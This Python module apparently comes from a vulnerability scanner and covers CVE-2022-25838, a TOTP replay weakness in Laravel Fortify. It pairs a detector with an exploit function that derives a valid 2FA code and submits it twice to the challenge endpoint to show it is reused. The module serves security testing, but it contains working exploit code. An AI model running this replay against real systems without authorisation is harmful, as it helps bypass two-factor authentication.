#!/usr/bin/env python3
from __future__ import annotations

from modules.cves.metadata import metadata_dict_for as _metadata_dict_for

META = _metadata_dict_for('CVE-2022-25838')

# ---------------------------------------------------------------------------
# Detection half
# ---------------------------------------------------------------------------
"""
CVE-2022-25838 — Laravel Fortify < 1.11.1 TOTP Reuse Weakness (SAFE DETECTOR)

Summary:
    Laravel Fortify before version 1.11.1 allows reuse of the same TOTP code
    within a short time window. This undermines the "one-time" guarantees of
    TOTP authentication.

This module performs SAFE detection (aligned to the validated-working exploit path):

 ✔ Self-fetches the seeded 2FA secret from GET /two-factor-secret (no auth required)
 ✔ Probes POST /two-factor-challenge UNAUTHENTICATED with a fresh + replayed TOTP
 ✔ If the server accepts the SAME TOTP code twice → vulnerable
 ✔ Does NOT attempt code guessing or password attacks
 ✔ Accepts an OPTIONAL session/totp_secret but never REQUIRES them

"""

import time
import hmac
import base64
import struct
import hashlib
import requests
from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)

# RFC 6238 base32 test-vector secret the lab seeds (also the documented default).
# Defined locally so detection has NO dependency on the exploitation half.
_LAB_2FA_SECRET = "JBSWY3DPEHPK3PXP"


def _safe_post(url, session, data, timeout=6):
    try:
        return session.post(url, data=data, timeout=timeout, verify=False, allow_redirects=False)
    except Exception:
        return None


def _generate_totp(secret, interval=30, digits=6):
    try:
        secret_bytes = base64.b32decode(secret.upper())
    except Exception:
        return None

    counter = int(time.time()) // interval
    msg = struct.pack(">Q", counter)
    h = hmac.new(secret_bytes, msg, hashlib.sha1).digest()
    o = h[19] & 0x0F
    token = (struct.unpack(">I", h[o:o+4])[0] & 0x7fffffff) % (10 ** digits)
    return str(token).zfill(digits)


def _accepted(resp) -> bool:
    """A 2FA challenge submission was accepted (vs. a 422 / error-body rejection).

    Mirrors the exploit's oracle: a 200/302 with an explicit error body
    ("errors" object / "two factor ... invalid") is a REJECTION, not a hit.
    """
    if resp is None:
        return False
    if resp.status_code not in (200, 302):
        return False
    low = (resp.text or "").lower()
    if '"errors"' in low or "two factor authentication code was invalid" in low:
        return False
    return True


def scan(target_url: str, *, session=None, username=None, password=None, totp_secret=None, **kwargs):
    base = target_url.rstrip("/")
    result = {
        "cve_id": "CVE-2022-25838",
        "name": "Laravel Fortify TOTP Reuse Weakness",
        "vulnerable": False,
        "status": "not_detected",
        "verdict": "not_detected",
        "proof_type": None,
        "endpoint": f"{base}/two-factor-challenge",
        "evidence": [],
        "detection_methods": [],
        "error": None,
    }

    endpoint = result["endpoint"]

    # Single session for the whole flow so the secret-fetch + both challenge POSTs
    # share one cookie jar (matches the validated-working exploit path). The session
    # kwarg is OPTIONAL — when check.py passes a fresh unauthenticated Session it is
    # used as-is; when nothing is passed we build our own. No auth is required.
    sess = session or http_config.get_auth_session()

    # ----------------------------------------------------
    # Step 1 — Determine the TOTP secret (self-fetch like the exploit).
    #   Precedence: explicit totp_secret arg -> GET /two-factor-secret.
    # ----------------------------------------------------
    secret = totp_secret
    if not secret:
        try:
            hr = sess.get(f"{base}/two-factor-secret", timeout=6, verify=False)
            if hr is not None and hr.status_code == 200:
                secret = (hr.json() or {}).get("two_factor_secret")
        except Exception:
            secret = None
    if not secret:
        result["error"] = "TOTP secret unavailable"
        result["requires"] = ["totp_secret or reachable /two-factor-secret"]
        result["evidence"].append(
            "No TOTP secret supplied and /two-factor-secret did not disclose one; "
            "pass --opt totp_secret=... for local lab material."
        )
        return result

    # ----------------------------------------------------
    # Step 2 — Generate a valid TOTP token
    # ----------------------------------------------------
    totp = _generate_totp(secret)
    if not totp:
        result["error"] = "Invalid TOTP secret"
        return result

    payload = {"code": totp}

    # ----------------------------------------------------
    # Step 3 — First authentication attempt (unauthenticated)
    # ----------------------------------------------------
    r1 = _safe_post(endpoint, sess, payload)
    if r1 is None:
        result["error"] = "No response during first TOTP submission"
        return result

    first_ok = _accepted(r1)

    # ----------------------------------------------------
    # Step 4 — Second authentication attempt (reuse the SAME code)
    # ----------------------------------------------------
    r2 = _safe_post(endpoint, sess, payload)
    if r2 is None:
        result["error"] = "No response during second TOTP submission"
        return result

    second_ok = _accepted(r2)

    # ----------------------------------------------------
    # Step 5 — TOTP Reuse Detection
    # ----------------------------------------------------
    if first_ok and second_ok:
        result["vulnerable"] = True
        result["status"] = "confirmed_vulnerable"
        result["verdict"] = "confirmed_vulnerable"
        result["proof_type"] = "safe_active"
        result["detection_methods"].append("totp_reuse")
        result["evidence"].append("Server accepted the same TOTP twice (Fortify < 1.11.1).")
    else:
        result["status"] = "blocked_by_control"
        result["verdict"] = "blocked_by_control"
        result["proof_type"] = "safe_active"
        result["evidence"].append("Server rejected reused TOTP — likely patched.")

    return result


# ---------------------------------------------------------------------------
# Exploitation half
# ---------------------------------------------------------------------------
"""CVE-2022-25838 exploitation half — Laravel Fortify < 1.11.1 TOTP replay/reuse.

Split from the original modules/cve_2022_25838.py (detection half:
modules/cves/cve_2022_25838.py). Exploitation may import from modules root
(shared infra) and modules.detection; never the reverse.
"""

import requests

from modules.core import http_config

requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning
)


# ---------------------------------------------------------------------------
# Exploit (per /tmp/EXPLOIT_CONTRACT.md)
# ---------------------------------------------------------------------------
#
# CVE-2022-25838 is a TOTP *replay/reuse* weakness in Laravel Fortify < 1.11.1:
# a CURRENTLY-VALID one-time code is accepted MORE THAN ONCE within its 30s
# time-step window because Fortify does not cache used codes (RFC 6238 §5.2).
#
# This is a behavioural / auth-oracle demonstration (closest contract bucket:
# "timing" — a server-behaviour oracle, not an RCE/SQLi command sink). It is
# NOT command-capable: there is no shell/SQL/template sink to deliver a payload
# into, so `command` is ignored. It is NOT -U/-P authenticated: the documented
# precondition is possession of a *valid intercepted code*; against the lab the
# seeded secret is fetched from the GET /two-factor-secret helper (or the
# documented default), then the current TOTP is computed and replayed.
#
# Success == the SAME valid code is accepted twice (two HTTP 200/302), proving
# the missing replay cache. A patched Fortify (>= 1.11.1) rejects the second
# submission (422), giving success=False honestly.

# RFC 6238 base32 test-vector secret the lab seeds (also documented default).
_LAB_2FA_SECRET = "JBSWY3DPEHPK3PXP"


def _accepted(resp) -> bool:
    """A 2FA challenge submission was accepted (vs. 422 rejection)."""
    if resp is None:
        return False
    if resp.status_code not in (200, 302):
        return False
    # The lab returns JSON {"status":"authenticated"} on success and a 422 with
    # an "errors" object on rejection; treat an explicit error body as a reject
    # even if (improbably) returned with a 200.
    body = (resp.text or "")
    low = body.lower()
    if '"errors"' in low or "two factor authentication code was invalid" in low:
        return False
    return True


def exploit(target_url, *, username=None, password=None, command=None, options=None, session=None, **kwargs):
    """Demonstrate the Fortify TOTP replay (CVE-2022-25838) against a live target.

    Fetches/derives the 2FA secret, generates the currently-valid TOTP, submits
    it once (must be accepted), then replays the SAME code immediately. If the
    replay is also accepted the one-time guarantee is broken -> success.
    """
    result = {
        "cve": "CVE-2022-25838",
        "attempted": True,
        "success": False,
        "vuln_class": "timing",
        "evidence": "",
        "detail": "",
        "artifacts": {},
        "requires": [],
        "reason": "",
    }

    options = options or {}
    base = target_url.rstrip("/")
    endpoint = base + "/two-factor-challenge"

    try:
        sess = session or http_config.get_auth_session()
        sess.headers.update({
            "User-Agent": http_config.BROWSER_USER_AGENT,
            "X-lvcscan": "CVE-2022-25838",
            "Accept": "application/json",
        })

        # --- Determine the TOTP secret (a real attacker intercepts a valid CODE).
        #     Precedence: options["totp_secret"] -> GET /two-factor-secret helper.
        secret = options.get("totp_secret")
        secret_source = "options.totp_secret"
        if not secret:
            try:
                hr = sess.get(base + "/two-factor-secret", timeout=8, verify=False)
                if hr is not None and hr.status_code == 200:
                    secret = (hr.json() or {}).get("two_factor_secret")
                    secret_source = "GET /two-factor-secret"
            except Exception:
                secret = None
        if not secret:
            result["reason"] = "TOTP secret unavailable; pass --opt totp_secret=... or expose /two-factor-secret"
            result["requires"] = ["valid_totp_code_or_secret"]
            return result

        code = _generate_totp(secret)
        if not code:
            result["reason"] = f"could not derive a valid TOTP from secret ({secret_source})"
            result["requires"] = ["valid_totp_code"]
            return result

        # --- First submission: must be accepted, else we never had a valid code.
        r1 = _safe_post(endpoint, sess, {"code": code})
        if r1 is None:
            result["reason"] = "no response to first /two-factor-challenge submission"
            result["requires"] = ["reachable_two_factor_challenge_endpoint"]
            return result

        first_ok = _accepted(r1)
        if not first_ok:
            # The endpoint is reachable but did not accept the freshly-generated
            # code (wrong secret, clock skew, or not a Fortify 2FA target).
            result["detail"] = "endpoint did not accept a freshly-generated TOTP"
            result["reason"] = (
                f"first submission rejected (HTTP {r1.status_code}); the generated "
                f"code is not currently valid for the target's secret (skew/wrong secret) "
                f"or this is not a Fortify TOTP challenge endpoint"
            )
            result["requires"] = ["valid_totp_code"]
            result["artifacts"] = {
                "endpoint": endpoint,
                "secret_source": secret_source,
                "code": code,
                "first_status": r1.status_code,
            }
            return result

        # --- Replay the SAME code immediately (no sleep — stay inside the window).
        r2 = _safe_post(endpoint, sess, {"code": code})
        if r2 is None:
            result["reason"] = "no response to replayed /two-factor-challenge submission"
            return result

        second_ok = _accepted(r2)

        result["artifacts"] = {
            "endpoint": endpoint,
            "secret_source": secret_source,
            "code": code,
            "first_status": r1.status_code,
            "first_body": (r1.text or "")[:200],
            "replay_status": r2.status_code,
            "replay_body": (r2.text or "")[:200],
        }

        if second_ok:
            result["success"] = True
            result["evidence"] = (
                f"Same valid TOTP '{code}' accepted TWICE: "
                f"first POST {endpoint} -> HTTP {r1.status_code} {(r1.text or '')[:120]!r}; "
                f"replay -> HTTP {r2.status_code} {(r2.text or '')[:120]!r}. "
                f"No replay cache (Fortify < 1.11.1, RFC 6238 §5.2 violation)."
            )
            result["detail"] = "TOTP replay accepted — one-time code reusable within its window"
        else:
            result["detail"] = "replay rejected — target appears patched (Fortify >= 1.11.1)"
            result["reason"] = (
                f"first code accepted (HTTP {r1.status_code}) but replay rejected "
                f"(HTTP {r2.status_code}) — used-code cache present, not vulnerable"
            )

        return result

    except Exception as e:
        result["reason"] = f"exploit error: {e}"
        return result
